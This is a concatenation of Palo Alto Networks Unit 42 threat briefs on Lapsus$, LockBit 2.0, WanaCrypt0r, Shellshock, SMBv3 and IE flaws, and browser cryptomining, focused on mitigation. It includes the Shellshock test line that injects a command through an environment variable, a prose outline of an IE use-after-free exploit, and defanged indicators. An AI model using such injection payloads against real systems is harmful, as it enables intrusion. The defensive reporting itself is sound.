"Though sometimes called a ransomware group in reports, Lapsus$ is notable for not deploying ransomware in extortion attempts."
"In today’s environment, threat actors favor using ransomware to encrypt data and systems and often extort victims for significant amounts of cryptocurrency in exchange for decryption keys, sometimes turning up the pressure with the threat of publishing stolen data."
"Lapsus$, however, is unusual in its approach – for this group, notoriety most often appears to be the goal, rather than financial gain."
Unit 42 has helped organizations respond to multiple Lapsus$ attacks.
"The Lapsus$ Group doesn’t employ malware in breached victim environments, doesn’t encrypt data and in most cases, doesn’t actually employ extortion."
They focus on using a combination of stolen credentials and social engineering to gain access to victims.
"We’ve also seen them solicit employees on Telegram for their login credentials at specific companies in industries including: telecom, software, gaming, hosting providers and call centers."
"However, the group’s attacks and leaking of stolen data even without extortion can be very damaging."
"In addition, we’ve seen destructive Lapsus$ attacks where the actors got access to an organization’s cloud environment, wiped systems and destroyed over a thousand virtual machines."
"Although there are no public indicators of compromise (IoCs), and no tactics, techniques and procedures (TTPs) that are unique to Lapsus$ Group, here we will summarize what is known of this threat actor to better enable defenders in understanding and mitigating this threat."
Early Targets of Lapsus$ Evolution of Targeted Organizations Mitigation Actions Conclusion
Additional Resources
"We first observed the “Lapsus$” handle mid-2021, but the first attack activity quoting that handle was in August 2021, with some U.K. mobile phone customers reporting receiving threatening texts (Figure 1)."
"In December 2021, the Ministry of Health of Brazil fell victim to an attack claimed by Lapsus$ (Figure 2)."
"This included the soon-to-be de rigueur data exfiltration and deletion technique, and also redirection of some DNS records."
"This was followed in short order by attacks on South American telecoms providers Claro and Embratel, Brazilian state-owned postal service “Correios,” and Portuguese media giant Impresa."
"This initial focus has led to speculation that Lapsus$ Group may be Brazilian, although we understand the choice of targets to have been influenced by extended team members rather than the team leadership."
"Apart from Argentinian eCommerce provider Mercado Libre / Mercado Pago, subsequent victimology has departed South America and pivoted to focus on the high-tech sector. Recent public victims have included: It should be understood that in addition there are likely any number of other victims, targeted by attacks not known in the public sphere."
"It is likely that some victims are not the intended end-target, but are rather breached in order to gain access to their customers, or for example, to help bypass multi-factor authentication (MFA)."
"To this end, we are aware of this actor’s involvement in vishing, SIM-swapping and soliciting third parties at providers for insider access."
"For example, in the “proof” of the Okta breach posted on the Lapsus$ Group’s Telegram channel, the actor states: “… our focus was ONLY on okta customers” (Figure 3)"
Several of the Lapsus$ Group’s attacks involved the theft and publication of source code.
"In the case of Nvidia, it was observed as a non-financial extortion attempt."
"In other cases, for example that of Microsoft, there was simply publication without extortion, again supporting the understanding that the primary motivation of this actor is notoriety rather than financial gain."
"However, as notoriety and success cause this group to grow, we should expect to see diversity of membership reflected in a diversity of victimology, TTPs and action-on-objective motivations."
"Owing to the diversity of techniques used, and the lack of use of malware, there is no single defense against or detection of Lapsus$ attacks specifically."
A hallmark of this group is the diversity of techniques used both for initial access and action-on-objective.
"Credentials are harvested from dumps, purchased or spear-phished."
"When employed, various techniques to bypass MFA are observed – from social engineering, through SIM-swapping and even compromising MFA/telecoms providers. Zero Trust network architecture and strong security hygiene are the best defenses against this type of threat actor."
"If Lapsus$ has purchased credentials for a network, they can effectively operate as an insider threat, taking advantage of the same privileges the employee has inside the network. Focus on general information security best practices: MFA, access controls and network segmentation."
"Ensure your organization has the ability to detect anomalous activity, including activity that involves trusted third parties in your environments, and protect against non-technical techniques such as vishing and SIM-swapping."
"Patching of internal systems that might support lateral movement and privilege escalation should be prioritized, as well as against known public exploits that these actors might employ."
"Although the commodity malware RedLine Stealer has been implicated for credential harvesting in some attacks, it’s unclear if this is first- or third-party, and it cannot be used as a definitive indicator of Lapsus$-specific activity."
"Lapsus$ Group has made headlines recently for high-profile attacks, with an apparent goal of gaining notoriety."
They claim in some cases to have targeted organizations with the specific goal of gaining access to customers.
"While referred to as a ransomware group in many reports, the Lapsus$ Group is more accurately called an attack group."
"Most notably, their focus to date does not appear to have been on extortion and financial gain."
"Even without extortion, the group’s attacks and leaks of stolen information can be damaging."
"Because the group uses a diversity of techniques for attacks, no single technique can protect against Lapsus$ or detect its attacks."
"Because of this, we recommend that organizations focus on observing general information security best practices as described in the Mitigation Actions section above."
"Unit 42, together with researchers at Unit 221b, identified the primary actor behind the Lapsus$ Group moniker in 2021, and have been assisting law enforcement in their efforts to prosecute this group."
"If you think you may be subject to an active attack or have an urgent matter, get in touch with the Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200."
Palo Alto Networks will update this Threat Brief with new information and recommendations as they become available. DEV-0537 criminal actor targeting organizations for data exfiltration and destruction A Closer Look
the
LAPSUS$
Data Extortion Group Lapsus$ Telegram channel: t[.]me/minsaudebr
"Email address associated with Lapsus$ Group: saudegroup[at]ctemplar[.]com Updated March 25, 2022, at 8:30 a.m. PT."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) LockBit 2.0 is ransomware as a service (RaaS) that first emerged in June 2021 as an upgrade to its predecessor LockBit (aka ABCD Ransomware), which was first observed in September 2019."
"Since its inception, the LockBit 2.0 RaaS attracted affiliates via recruitment campaigns in underground forums, and thus became particularly prolific during the third quarter of calendar year 2021."
"The LockBit 2.0 operators claimed to have the fastest encryption software of any active ransomware strain as of June 2021, claiming accordingly that this added to its effectiveness and ability to disrupt the ransomware landscape."
"While several top-tier RaaS affiliate programs, such as Babuk, DarkSide and REvil (aka Sodinokibi) disappeared from the underground in 2021, LockBit 2.0 continued to operate and gradually became one of the most active ransomware operations."
"While Conti was recognized as being the most prolific ransomware deployed in 2021 per our 2022 Unit 42 Ransomware Threat Report, LockBit 2.0 is the most impactful and widely deployed ransomware variant we have observed in all ransomware breaches during the first quarter of 2022, considering both leak site data and data from cases handled by Unit 42 incident responders."
"According to data analysis of ransomware groups’ dark web leak sites, LockBit 2.0 was the most impactful RaaS for five consecutive months."
"As of May 25, LockBit 2.0 accounted for 46% of all ransomware-related breach events for 2022."
"And the LockBit 2.0 RaaS leak site has the most significant number of published victims, with over 850 in total."
"Additionally, LockBit 2.0 has affected many companies globally, with top victims based in the U.S., Italy and Germany."
"Its most highly targeted industry verticals include professional services, construction, wholesale and retail, and manufacturing."
"Palo Alto Networks customers receive protections against LockBit 2.0 attacks from Cortex XDR, as well as from the WildFire cloud-delivered security subscription for the Next-Generation Firewall."
"(Please see the Conclusion section for more detail.) LockBit 2.0 Overview Victimology Leak Site Data Unit 42 Incident Response Data on LockBit 2.0 LockBit 2.0 Tactics, Techniques and Procedures LockBit 2.0 Technical Details LockBit 3.0 Courses of Action Conclusion"
Appendix A Additional Resources
LockBit 2.0 is another example of RaaS that leverages double extortion techniques as part of the attack to pressure victims into paying the ransom.
"In some cases, LockBit 2.0 operators have performed DDoS attacks on the victims' infrastructure as well as using a leak site."
"This practice is known as triple extortion, a tactic observed in groups like BlackCat, Avaddon and SunCrypt in the past."
"Like other ransomware families such as BlackByte, LockBit 2.0 avoids systems that use Eastern European languages, including many written with Cyrillic alphabets."
"Unlike other RaaS programs that don't require the affiliates to be super technical or savvy, LockBit 2.0 operators allegedly only work with experienced penetration testers, especially those experienced with tools like Metasploit and Cobalt Strike."
"Affiliates are tasked with gaining initial access to the victim network, allowing LockBit 2.0 to conduct the rest of the attack."
LockBit 2.0 has been observed changing infected computers’ backgrounds to a ransomware note.
The ransomware note was also used to recruit insiders from victim organizations.
The notes claimed the threat actors would pay “millions of dollars” to insiders who provided access to corporate networks or facilitated a ransomware infection by opening a phishing email and/or launching a payload manually.
"The threat actors also expressed interest in other access methods such as RDP, VPN and corporate email credentials."
"In exchange, they offer a cut of the paid ransom."
LockBit 2.0 targets organizations opportunistically.
The operators work with initial access brokers to save time and allow for a larger profit potential.
"While typically seeking victims of opportunity, LockBit 2.0 does appear to have victim limitations."
"The group announced that they would not target healthcare facilities, social services, educational institutions, charitable organizations and other organizations that “contribute to the survival of the human race”."
"However, despite these claims, there have been instances of affiliates undermining these guidelines by still opting to attack industry verticals such as healthcare and education."
"Organizations in Europe and the U.S. are hit more often by LockBit 2.0 than those in other countries, likely due to the high profitability and insurance payouts."
"During the first calendar year quarter of 2022, LockBit 2.0 persisted as the most impactful and the most deployed ransomware variant we observed in all ransomware breaches shared on leak sites."
"According to leak site data analysis, LockBit 2.0 was the most impactful RaaS for five consecutive months."
"As of May 25, LockBit 2.0 accounted for 46% of all ransomware-related breach events for 2022 shared on leak sites."
"Additionally, the LockBit 2.0 RaaS leak site has the most significant number of published victims, with over 850 in total."
"The site itself typically features information such as victim domains, a time tracker and measures of how much data was compromised."
"LockBit 2.0 claims that they have demanded ransom from at least 12,125 companies, as shown in the figure below."
"According to leak site data for LockBit 2.0, since its inception in June 2021, the RaaS has affected many companies globally, with top victims based in the U.S., Italy and Germany. LockBit 2.0 has also impacted various victims across multiple industry verticals."
"Its most highly targeted industry verticals include professional services, construction, wholesale and retail and manufacturing."
"When looking at leak site data across all ransomware families, we’ve observed LockBit 2.0 targeting the highest number of organizations in the following regions: JAPAC, EMEA, and LATAM."
Cases handled by Unit 42 security consultants involving LockBit 2.0 since its appearance in June 2021 demonstrate shorter dwell times and less flexibility in negotiation in the beginning of FY 2022 (measured October-September) in comparison to the end of FY 2021.
"The following data is broken into fiscal years and quarters based on when the threat actor breached the network, not when the activity was noticed by a client."
LockBit 2.0 has shown a decrease in dwell time in FY 2022.
"From the last two quarters of FY 2021 to the first two quarters of FY 2022, there has been an average 37-day difference."
The difference in initial and final ransom demands over the past fiscal year has been converted to percentages and then averaged.
"The graph below demonstrates that at the end of FY 2021, threat actors using LockBit 2.0 were much more open to negotiations of ransom amounts; during that time the ransom was dropped approximately 83% from the initial ask on average."
"In comparison, we see less flexibility in FY 2022 Q1 and Q3 – threat actors only offered an average of about 30% as a price drop."
FY 2022 Q2 is not included due to lack of sufficient information.
"Technically speaking, we have observed LockBit 2.0 affiliates leveraging the following tactics, techniques and procedures: Windows SysInternals PsExec has been utilized for both persistence and execution purposes."
Its ability to execute processes on other systems spread the ransomware and assisted in reconnaissance activities.
LockBit 2.0 was developed using the Assembly and Origin C programming languages and leverages advanced encryption standard (AES) and elliptic-curve cryptography (ECC) algorithms to encrypt victim data.
"It can affect both Windows and Linux OS, as the operator released a Linux version of LockBit 2.0 to target VMware ESXi hypervisor systems in October 2021, coded exclusively in the C programming language."
"The LockBit group claimed that LockBit 2.0 is “the fastest encryption software all over the world” and provided a comparative table showing the encryption speed of various ransomware samples. LockBit 2.0 also contains a self-spreading feature, clears logs and can print the ransom note on network printers until the paper runs out. A management panel that affiliates can use to manage victims and affiliate accounts, generate new ransomware builds and generate the decryptor if the demanded ransom is paid also exists."
"LockBit 2.0 operators also released an information-stealer dubbed StealBit, which was developed to support affiliates of the LockBit 2.0 RaaS when exfiltrating data from breached companies."
StealBit contains the following capabilities:
The operator of LockBit 2.0 has provided a comparative table speed showing the information stealer compared to other tools.
There was a bug that existed in LockBit 2.0 that allowed researchers to revert the encryption process on an MSSQL database.
"After the bug’s disclosure, LockBit forum members discussed how the bug will not exist in LockBit’s next iteration."
"Moreover, on March 17, LockBit forum members mentioned the release of LockBit’s next version in one or two weeks."
"On March 25, VX underground posted a tweet with details of this new version, dubbed LockBit Black."
"Several adversarial techniques were observed in this activity and the following measures are suggested within Palo Alto Networks products and services to ensure mitigation of threats related to LockBit 2.0 ransomware, as well as other malware using similar techniques: Exploit Public-Facing Application [T1190], Command and Scripting Interpreter [T1059], Local Account [T1136.001], Web Shell [T1505.003], Exploitation for Privilege Escalation [T1068], Indicator Removal on Host [T1070], Deobfuscate/Decode Files or Information [T1140], Disable or Modify Tools [T1562.001], Hidden Window [T1564.003], Valid Accounts [T1078], External Remote Services [T1133], Scheduled Task [T1053.005], Bypass User Account Control [T1548.002], Group Policy Modification [T1484.001] OS Credential Dumping [T1003], Credentials from Password Stores [T1555] Network Service Scanning [T1046], Process Discovery [T1057], System Location Discovery [T1614], System Information Discovery [T1082] Remote Services [T1021], SMB/Windows Admin Shares [T1021.002] Remote Access Software [T1219] Data Transfer Size Limits [T1030], Exfiltration Over C2 Channel [T1041] Data Encrypted for Impact [T1486], Service Stop [T1489] †These capabilities are part of the NGFW security subscriptions service"
Note: This is not an all-inclusive list of the protections provided by Palo Alto Networks.
This is a subset of our current Courses of Action initiative and will be updated as the project progresses.
"LockBit 2.0 and its evolution over time is a perfect example to illustrate the persistence, increasing complexity and impact brought by the ransomware landscape as a whole."
"With claims of this RaaS offering the fastest encryption on the ransomware market, coupled with the fact that it has been delivered in high volume by experienced affiliates, this RaaS poses a significant threat."
LockBit’s continuation with operations and its next iteration coming up on the horizon means that organizations and their security teams need to stay vigilant in the ever-evolving threat landscape.
Palo Alto Networks detects and prevents LockBit 2.0 ransomware in the following ways:
"If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members."
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
Learn more about the Cyber Threat Alliance.
"In August 2021, a Russian blogger published a 22-minute interview with an alleged representative of the group behind LockBit 2.0 called “LockBitSupp” on a YouTube channel called “Russian-language open source intelligence (OSINT).”"
"The same Russian blogger previously published interviews with a representative of the group behind the REvil ransomware-as-a-service (RaaS), hackers and security experts."
"Some key takeaways from the claims made in the interview were: LockBit 3.0: Another Upgrade to the World’s Most Active Ransomware Ransomware Groups to Watch: Emerging Threats Average Ransom Payment Up 71% This Year, Approaches $1 Million 2022 Unit 42 Ransomware Threat Report Highlights Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"On Saturday, Microsoft disclosed a critical vulnerability in Internet Explorer, CVE-2014-1776, affecting Internet Explorer versions 6 through 11."
The vulnerability exists in the way that Internet Explorer accesses an object in memory that has been deleted or has not been properly allocated.
The vulnerability allows an attacker to execute arbitrary code in the context of the current user within Internet Explorer.
"This could be exploited with drive-by downloads or watering-hole attacks, and has been observed being used in attacks in the wild."
"The exploit code used in these attacks only targets IE versions 9, 10 and 11, but earlier versions are still vulnerable."
"As of this writing, Microsoft has not stated when a patch for the vulnerability will be available, but in its advisory the company provided multiple work-arounds."
"Additionally, Windows XP systems running IE 6, 7 and 8 are also vulnerable, but will not receive a patch, as Microsoft no longer supports them."
It is always important to view this type of critical vulnerability in the larger context of the threat landscape.
"Attackers identify thousands of critical vulnerabilities in commonly used software each year, such as Internet Explorer."
"Once identified, they then craft a seemingly endless supply of exploits that leverage these vulnerabilities to deliver unknown malware and compromise networks and endpoints."
Palo Alto Networks enterprise security platform is focused on providing an integrated approach to detecting and preventing advanced threats across each step in the attack kill-chain.
"Bringing together our next-generation firewall – again a Gartner Magic Quadrant Leader – Threat Prevention, URL Filtering, WildFire, and Cyvera’s ability to prevent exploitation of unknown vulnerabilities will allow us to continue offering ground-breaking protection for our customers’ networks and endpoints, including Windows XP clients."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) In March 2020 Microsoft released a security advisory, ADV200005 | Microsoft Guidance for Disabling SMBv3 Compression, for a new remote code execution (RCE) vulnerability."
"Shortly after this advisory was released, Microsoft issued an out-of-band patch to protect affected users from CVE-2020-0796."
An out-of-band patch is typically released outside of the expected update period for a vendor.
"In this particular case, Microsoft is known to release updates on Patch Tuesday, which was two days prior to this out-of-band update."
"This vulnerability exists within the Microsoft Server Message Block 3.0 (SMBv3), specifically regarding malformed compression headers."
Compression headers are a feature that was added to SMBv3 negotiate context request packets in May 2019.
For successful unauthenticated exploitation an attacker would need to craft a SMBv3 packet that contains the malformed compression header to a vulnerable SMBv3 Server.
For SMBv3 clients would require enticing a user to connect to a compromised SMBv3 server that they control.
"At the time of release, Microsoft affirmed that they had not yet seen the vulnerability exploited in the wild (ITW)."
This vulnerability only affects SMBv3 and the following builds of the Microsoft Windows operating system (OS): Review the workaround guidance provided by the Microsoft Security Vulnerability.
"As always, we recommend our customers patch their systems as soon as possible."
Upgrade Cortex XDR and Traps agents for protection against this vulnerability regardless of whether your systems have installed the relevant security update from Microsoft.
"For client mitigation, recommend creating an outbound firewall rule to block SMB outbound on public and private interfaces."
Palo Alto Networks Cortex XDR and Traps provide protection against this vulnerability regardless of whether they are running on an unpatched instance of Microsoft Windows 10.
"Additionally, Palo Alto Networks offers multiple, additional complementary protections for this exploit."
"As a member of the Microsoft Active Protections Program (MAPP) program, Palo Alto Networks received early details of the vulnerability, providing greater understanding of the threat, which helps us implement strong product coverage."
"As always, we recommend keeping your Microsoft products up to date with the latest patches to mitigate this vulnerability."
Palo Alto Networks will update this Threat Brief with new information and recommendations as they become available.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) Around 6:00 am PST on September 24, the details of a vulnerability in the widely used Bourne Again Shell (Bash) were disclosed by multiple Linux vendors."
"The vulnerability, assigned CVE-2014-6271 by Mitre, was originally discovered by Stephane Chazelas, a Unix and Linux network and telecom administrator and IT manager at UK robotics company SeeByte, Ltd."
"While this vulnerability didn’t come with quite the fanfare or a catchy name like Heartbleed, the security community quickly dubbed it “Shellshock.”"
"Bash is present in most Linux and Unix distributions as well as Apple’s Mac OS X, and there’s a good chance anyone reading this has a system they need to patch."
"Palo Alto Networks initiated an emergency IPS content release to detect this vulnerability last night with Signature ID: 36729 ""Bash Remote Code Execution Vulnerability.”"
"All versions of PAN-OS and Panorama include the vulnerable version of Bash, but we’ve determined the issue is only exploitable by authenticated users."
Normal PAN-OS maintenance release updates will provide a fix for the vulnerability.
We have posted the advisory on our product vulnerability page.
Read on for more details.
Vulnerability Details CVE-2014-6271 exists in all versions of Bash and is related to how environment variables are processed when the shell starts up.
Environment variables are used by shell software to store pieces of information like the location of the user’s home directory.
"In addition to storing variables, Bash allows for storing shell functions in variables that users can call later."
"It’s in parsing these functions that the new Bash vulnerability exists, as the shell mistakenly executes code that is added after a function definition."
Here’s an example: $ env x='() { :;}; echo vulnerable'
"bash -c ""echo this is a test"""
vulnerable this is a test
"Bash should stop processing the environment variable “x” after the closing semicolon for the function, but instead continues to process “echo vulnerable”."
"At first glance, this might not seem too dangerous as executing commands is Bash’s primary function, but it’s important to understand that many other programs use Bash to process commands."
"While these two scenarios are currently the most-likely vectors for exploiting this vulnerability, it’s likely that other services use Bash in a network-exploitable way."
The only way to fully prevent exploitation is to upgrade Bash on the system to a non-vulnerable version. Impact
The good news is that this vulnerability was disclosed responsibly and patches are available for most platforms on the day of the public disclosure.
The bad news is that this vulnerability is going to have a very long tail.
Bash is the default shell for the most-popular Linux variants and every version of the software stretching back over two decades is vulnerable.
"Well-maintained systems will be patched today, but that dusty old system in the networking closet might never get the update."
"Additionally, network devices, embedded systems and Internet-connected devices (like IP Cameras) often run Linux and could be vulnerable."
"Fortunately, not every system is remotely exploitable simply because it’s running Bash, it also needs to be running an application which makes Bash accessible over the network."
"As described above, the most-common exploit scenario seems like it will be web servers running Apache and using CGI scripts."
Web servers are great resources for attackers.
"They can be used to: These are all likely outcomes from mass scanning of the Internet for vulnerable hosts, which are already underway."
"Recommendations Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"On January 2, 2017, one Bitcoin was worth US $985.56."
"By October 16, 2017, that same Bitcoin was worth US $ 5,707.40: a 579% increase in value in ten and a half months."
"By comparison, Ethereum has gone from US $8.15 per ether on January 2, 2017 to US $342.83 per ether on October 16, 2017: a jump of 4,206%. Cryptocurrencies are big money these days and seemingly getting bigger by the day. And if we’ve learned one thing about cybercriminals, they follow the money."
"So, it’s not surprising to see that cybercrime is turning its attention to cryptocurrencies."
"In our latest research, “Unauthorized Coin Mining in the Browser”, Unit 42 researchers show how cybercriminals have taken an old tactic, hijacking web browsers without the users consent or knowledge (commonly called a “drive -by attack”), and adapted it to make money in the increasingly lucrative cryptocurrencies markets."
"Before, drive-by attacks focused on abusing a browser’s legitimate download capabilities to download malware onto the victim’s system without their consent or knowledge."
These new drive-by attacks focus on hijacking the computational resources of the victim’s computer to “mine” cryptocurrency on behalf of the attackers.
The focus of these attacks is to use the victim’s web browser to access the computational resources of their system.
The attackers accomplish this through abuse of a legitimate tool by placing it on malicious or compromised websites and running it in the victim’s browser without his or her consent or knowledge when they visit the site.
"The tool is designed to “mine” cryptocurrencies, that is it earns credit in the cryptocurrency in exchange for computing power that is used to power the cryptocurrencies’ digital infrastructure."
"This tool has a legitimate use: sites can and do notify users that they’re using the site visitors’ resources in this way to support the site, typically as a substitute for ads on the site."
"But in this case, the attacker actually gets the credit that the victim’s computational resources earns without the visitors’ consent or knowledge making it a malicious attack."
"Put simply, the net result is that the victim’s computer slows down (sometimes significantly) while on the malicious or compromised website."
"And while the computer is impacted like this, the attacker is earning money."
The attacker steals the victims computing resources and translates it into a cryptocurrency like Bitcoin.
This new kind of attack tells us that at least some cybercriminals are starting to view theft of victim’s computing power to translate into cryptocurrencies as a better business proposition than the traditional practice of loading malware on the victim’s system through drive-by downloads.
And our research shows that this isn’t an isolated event.
"Our researchers analyzed over 1,000 of sites and what they found was very telling."
The good news is that these attacks are more like denial of service attacks: they don’t do lasting harm to your system and they end when you leave the site. The bad news is that these are harder to defend against than typical drive-by download attacks.
"Where drive-by download attacks usually exploit unpatched vulnerabilities, the root of these attacks is that they abuse otherwise legitimate functionality: you can’t prevent them by being fully patched."
"Security products that take a comprehensive, layered approach can help prevent these attacks."
"And if you think your system is being affected by one of these attacks, you can, in most cases, end the attack by either leaving the site or closing the browser."
"Most of all, this latest development shows how a changing economic landscape in turn changes the cybercrime landscape."
Loading malware through drive-by downloads is so 2012: in 2017 it’s about drive-by mining attacks to earn cryptocurrencies.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese) This Unit 42 blog provides an update on the threat situation surrounding the WanaCrypt0r ransomware attacks and how the attack propagates.
Initial reports said that the WanaCrypt0r attack began as part of a spam/phishing campaign.
Unit 42 and other researchers have concluded that these reports are not substantiated.
"While the initial attack vector for these attacks is unknown, it is certain that the spread of the ransomware occurs through active exploitation of the ETERNALBLUE vulnerability (CVE-2017-0144) in Microsoft Windows."
Patches for this vulnerability for all supported versions of Windows have been available since March 2017.
"On Friday May 12, 2017, Microsoft took the extraordinary step of releasing patches for out-of-support versions of Windows to help protect against these attacks."
"As the attack leverages this Microsoft vulnerability, the most appropriate first step to take against the attack is to apply the patches."
Unit 42 researchers have confirmed that the patch is effective against the WanaCrypt0r Ransomware attacks.
"In addition, Palo Alto Networks, and other vendors, including our fellow members of the Cyber Threat Alliance, have released additional protections that help prevent the spread of the WanaCrypt0r ransomware."
"For information on Palo Alto Networks protections, please see our posting Palo Alto Networks Protections Against WanaCrypt0r Ransomware Attacks."
"As with all ransomware attacks, Palo Alto Networks and Unit 42 recommends that anyone affected NOT pay the ransom."
Unit 42 is not aware of any reports where paying the ransom to the WanaCrypt0r attackers has resulted in the recovery of data.
"In addition, Unit 42 research has shown that very few have attempted to pay the ransom."
Unit 42 is following this situation very closely and will update this blog with any new information as it becomes available.
"WanaCrypt0r is a global ransomware attack that emerged on Friday, May 12, 2017."
"It immediately gained broad media attention, due to its destructive nature, how widespread it was, and multiple high profile victims."
This attack uses the version 2.0 of this ransomware.
WanaCrypt0r v 1.0 was first reported a few months ago but did not include the worm capability associated with this attack.
"Reports quickly emerged that this attack was effective due to the presence of code exploiting a vulnerability (CVE-2017-0144) in Microsoft Windows (code named: ETERNALBLUE) that was released as part of the Equation Group dump by the Shadow Brokers in their fifth leak on April 14, 2017."
Microsoft patched this vulnerability as part of the March 2017 Monthly Security Update Release by Microsoft Security Bulletin MS17-010.
This is a SYSTEM-level remote code execution (RCE) in the handling of the Server Message Block (SMB) protocol in Microsoft Windows.
The attack uses this vulnerability to spread the WanaCrypt0r ransomware on the network.
This is a classic network worm-class vulnerability like MS-Blaster and Conficker.
Early reports indicated that the initial attack vector was via spam and/or phishing email.
"However, this has not been confirmed and is unlikely to account for the global spread of the malware."
"When the WanaCrypt0r ransomware executes successfully, it will encrypt key files on the system and display a ransom note as shown below (SOURCE: Microsoft)."
Figure 1 Ransom note for WanaCrypt0r
One thing reports have indicated that make this attack unique is a “killswitch” capability built into the malware.
This “killswitch” will prevent the WanaCrypt0r ransomware from executing.
The “killswitch” is code which will attempt to connect to an extremely long domain that should not resolve.
"The initial variant of WanaCrypt0r uses hxxp://iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com, however, there are reports of newer variants using different domains."
"If it was successful in connecting to the domain, the ransomware would not execute."
"However, it was easily subverted to work against the malware."
"A security researcher in the United Kingdom initially registered this domain in order to track this threat, and soon discovered that in doing so, he had enabled this “killswitch”, causing a number of instances of WanaCrypt0r to not execute for a large number of infected systems."
"On Friday, May 12, 2017, Microsoft announced that they were making an emergency patch available for out-of-support versions of Windows (Windows XP, Windows 8 and Windows Server 2003)."
As of this writing attacks appear to have subsided.
"This is likely due to increased uptake of the patch MS17-010 in light of the WanaCrypt0r attacks, as well as efforts made within the security community."
Unit 42 research shows there is likely very little actual payment of ransom.
"We analyzed our known WanaCrypt0r samples and extract the following Bitcoin (BTC) addresses likely associated with the attackers and associated totals: This results in a total of 36 BTC, or roughly $63k based on the current price of BTC."
"Given that WanaCrypt0r requests $300 per infected machine, we can infer that approximately 210 victims have made payments to the attackers."
Reconnaissance This attack does not appear to be targeted.
"Therefore, there appears to be little recon as part of this attack."
"There are some reports that there may be scanning of TCP port 445, which is one of the ports associated with SMB."
But these reports haven’t been conclusively verified.
There is no consensus in the industry on what the delivery method/initial infection vector is.
There have been several theories: Unit 42 believes the most likely delivery method is method #2.
"However, this is not conclusively provenLateral Movement"
The WanaCrypt0r ransomware spreads itself by heavily scanning over TCP port 445 (associated with SMB) and attempting to exploit the ETERNALBLUE vulnerability on systems.
"A successful attack against this vulnerability will infect the target system with the WanaCrypt0r ransomware, which will encrypt data on the target system and attempt to spread itself once again."
Multiple vendors report that the malware includes the ability to spread via port 445 scans and attacks against the ETERNALBLUE vulnerability not only on internal networks but also across the Internet.
"These reports indicate that in addition to the internal lateral movement already outlined, the WanaCrypt0r ransomware will scan for port 445 on random external IP addresses and if it finds an IP address with an open port 445, it will then scan all devices on the same /24 IP range (i.e. that share the first three octets as that IP address with the open port 445). In general, WanaCrypt0r does not have C2 capabilities but it does utilize the TOR network to communicate encryption keys for decryption upon payment of ransom."
"It has been reported that the DOUBLEPULSAR backdoor (also from the Equation Group leak by Shadow Brokers) is installed and used to execute the malware after successful exploitation of a host via ETERNALBLUE, but this warrants further analysis."
"Overall, WanaCrypt0r has been a notable incident within the security community, as the threat couples a wormable vulnerability/exploit with a ransomware family."
Users are urged to apply the necessary Microsoft patch to protect themselves against this threat.
"For protections, customers are advised to view this blog post that outlines the various ways the Palo Alto Networks platform prevents this threat. Cyber Threat Alliance member ElevenPaths has developed a tool which can be used to attempt to recover some files deleted by WanaCrypt0r."
You can find more information on this tool here.
"Register for Ignite ’17 Security Conference Vancouver, BC June 12–15, 2017"
"Ignite ’17 Security Conference is a live, four-day conference designed for today’s security professionals."
"Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry."
"Visit the Ignite website for more information on tracks, workshops and marquee sessions."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
The latest episode of the Don’t Panic cybersecurity podcast is now live.
"In this latest episode, Ryan goes back to the topic he talked about in his 2018 predictions piece “The Era of Software Supply-Chain Attacks Has Begun”: Software Supply Chain attacks."
"As a reminder, “Don’t Panic,” is the official podcast of Unit 42, the Palo Alto Network threat intelligence team and features Palo Alto Networks CSO Rick Howard and Palo Alto Networks Senior Vice President, Threat Intelligence Ryan Olson. You can find this episode and other Palo Alto Networks podcasts on iTunes, Google Play, or integrate the RSS feed into your favorite service."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Late last month reports surfaced that a new Internet Explorer vulnerability (CVE-2014-1776) was being exploited in targeted attacks.
The vulnerability allows an attacker to take full control over the system after a user views a web page in their browser.
"According to Microsoft, it affects versions of Internet Explorer from version 6 to 11, meaning that almost all IE users are vulnerable to this bug."
"This vulnerability is so widespread that Microsoft has released patches to protect Windows XP, for which Microsoft has ended support since April 8, 2014."
Researchers from Palo Alto Networks have investigated this exploit in depth and concluded that this is a Use-After-Free vulnerability that occurs when Internet Explorer tries to reuse a freed CMarkup object.
Attackers can manipulate memory allocations by using JavaScript to allocate an object that is freed before all references to that object are removed.
Once the object is free the Flash file will overwrite a length field in the vector object and allow arbitrary memory access.
After that the exploit uses a ROP chain to overwrite the virtual function table of a sound object to gain full control.
The exploit utilized several advanced exploit techniques to make it almost 100% reliable.
"The exploit used in the wild contains two major parts, one is HTML which sets up the page to exploit, and the other is a Flash file which builds the memory layout in IE process and triggers the bug."
Two parts must be combined to ensure a successful attack.
The attack separated critical code into different pieces so that researchers could not reproduce the original exploit until they have both files.
